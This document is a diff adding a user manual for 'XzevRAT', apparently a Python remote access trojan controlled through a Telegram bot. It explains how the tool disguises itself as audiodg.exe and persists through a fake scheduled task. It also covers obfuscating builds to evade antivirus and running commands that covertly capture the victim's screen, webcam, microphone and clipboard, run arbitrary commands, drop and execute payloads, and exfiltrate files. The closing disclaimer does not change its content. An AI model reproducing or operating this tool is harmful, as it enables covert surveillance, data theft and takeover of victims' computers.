@@ -1,0 +1,161 @@
+1. Introduction
+
+XzevRAT is a powerful remote administration tool built in Python, using Telegram as its command and control channel. It gives you full control over the target machine (victim) from any device with Telegram installed.
+
+    Masking – the process disguises itself as the system process audiodg.exe, raising no suspicion.
+
+    Persistence – automatically registers itself in the Windows Task Scheduler, surviving reboots.
+
+    Anonymity – all traffic goes through Telegram; no open ports are used.
+
+    Cross‑platform – the controlling side runs on Windows, Linux, and macOS; the agent (victim) runs on Windows 7, 8, 10, and 11.
+
+2. Installation on the Victim Machine
+2.1. First Run
+
+On the first run, the RAT:
+
+    Creates a hidden folder in %APPDATA%\Microsoft\Windows\Caches\.
+
+    Adds a scheduled task named WindowsAudioService (runs at user login).
+
+    Masks its process as audiodg.exe.
+
+    Connects to your Telegram bot (the token is hardcoded).
+
+    Important: Ensure your Telegram bot is active and has permission to send messages to the channel / your private chat.
+
+3. Control via Telegram
+
+All commands are sent to your bot’s chat or to the channel (if configured). Each command starts with /.
+3.1. Core Commands
+/list
+
+Description: Shows a list of all online devices.
+Example: /list
+Response:
+text
+
+🟢 Device-1 (Windows 10) - Online
+🟢 Device-2 (Windows 11) - Online
+
+/screen username
+
+Description: Takes a screenshot of the victim’s desktop and sends it to the chat.
+Example: /screen tester
+Response: image (photo).
+/webcam username
+
+Description: Takes a photo from the victim’s webcam. If the camera is busy, an error will be returned.
+Example: /webcam tester
+Response: image from the camera.
+/micro username
+
+Description: Records 10 seconds of audio from the victim’s microphone and sends a WAV/OGG file.
+Example: /micro tester
+Response: audio file microphone.wav.
+/buffer username
+
+Description: Displays the current content of the victim’s clipboard.
+Example: /buffer tester
+Response: text from the clipboard or “Clipboard is empty”.
+/presskey username key_combination
+
+Description: Simulates key presses on the victim’s keyboard. Supports combinations like alt+f4, ctrl+shift+t, win+r, etc.
+Format: /presskey [username] [combination]
+Example: /presskey tester alt+f4
+Response: “Combination alt+f4 sent”.
+/cmd username command
+
+Description: Executes any command in the command prompt (CMD) on the victim’s machine. Can run PowerShell or scripts.
+Format: /cmd [username] [command]
+Example: /cmd tester ipconfig /all
+Response: returns the output of ipconfig /all.
+/browser username URL
+
+Description: Opens the specified URL in the victim’s default browser.
+Format: /browser [username] [URL]
+Example: /browser tester youtube.com
+Response: link opened.
+/wallpaper username (with an attached image file)
+
+Description: Changes the victim’s desktop wallpaper to the sent image.
+Format: Send a photo/image with the caption /wallpaper [username]
+Example: /wallpaper tester (and attach an image)
+Response: wallpaper changed.
+/play username (with an attached audio file)
+
+Description: Plays the sent audio file on the victim’s computer.
+Format: Send an audio file with the caption /play [username]
+Example: /play tester (and attach audio)
+Response: audio playback started.
+/upload username (with an attached file)
+
+Description: Uploads a file to the victim’s machine. The file is saved in the hidden folder C:\Users\Public\Documents\XzevCache\.
+Format: Send a file with the caption /upload [username]
+Example: /upload tester (and attach a file)
+Response: file uploaded.
+/execute username filename
+
+Description: Executes a previously uploaded file (e.g., .exe).
+Format: /execute [username] [filename]
+Example: /execute tester payload.exe
+Response: file executed.
+/files username
+
+Description: Lists the contents of the Desktop, Documents, and Downloads folders. Displays files and folders with sizes and dates.
+Example: /files tester
+Response: list of files.
+/export username file_path
+
+Description: Downloads the specified file from the victim’s machine.
+Format: /export [username] [full_path]
+Example: /export tester C:\Users\Public\Documents\secret.txt
+Response: sends the file to the chat.
+/off username
+
+Description: Shuts down the victim’s computer (simulates a system failure).
+Example: /off tester
+Response: “PC is shutting down...” (executed without confirmation).
+/restart username
+
+Description: Restarts the victim’s computer.
+Example: /restart tester
+Response: “PC is restarting...”
+/killme username
+
+Description: Completely self‑destructs the RAT: deletes all its files, scheduled tasks, and terminates the process — no trace left.
+Example: /killme tester
+Response: “Self‑destruct initiated. Goodbye.” – after this, the RAT disappears.
+4. Additional Features
+4.1. Code Obfuscation
+
+The package includes tools for obfuscating the source code (multi‑layer encryption, string substitution, junk code insertion). This makes detection by antiviruses almost impossible. Use the encrypt.py script to generate a protected build.
+4.2. Cross‑Platform Support
+
+The controlling side (bot) can run on any OS with Python and Telegram. The agent (victim) currently runs only on Windows (7, 8, 10, 11). However, you can compile the agent for Linux/macOS with some code adjustments.
+5. Setting Up the Telegram Channel and Bot
+
+    Create a bot via @BotFather and obtain its token.
+
+    Create a private channel (or group) where the bot will send reports and screenshots.
+
+    Add the bot to the channel as an administrator with permission to send messages.
+
+    In the RAT code, specify the bot token and the channel/chat ID in main.py.
+
+    Done! All commands will be delivered to this channel/chat.
+
+    Tip: Use a separate Telegram account for the bot and do not expose your main account.
+
+6. Security and Masking
+
+    Process: The RAT renames itself to audiodg.exe and runs from (or copies itself to) a system folder.
+
+    Task Scheduler: A task with a name resembling a system update is created.
+
+    Obfuscation: The source code undergoes multi‑layer encryption and compression, breaking antivirus signatures.
+
+    Traffic: All commands and responses are transmitted via the Telegram Bot API, requiring no open ports on the router.
+
+Disclaimer: This tool is intended solely for ethical penetration testing and educational purposes. Unauthorised use on machines without the owner’s consent is prohibited. The author bears no responsibility for any misuse.
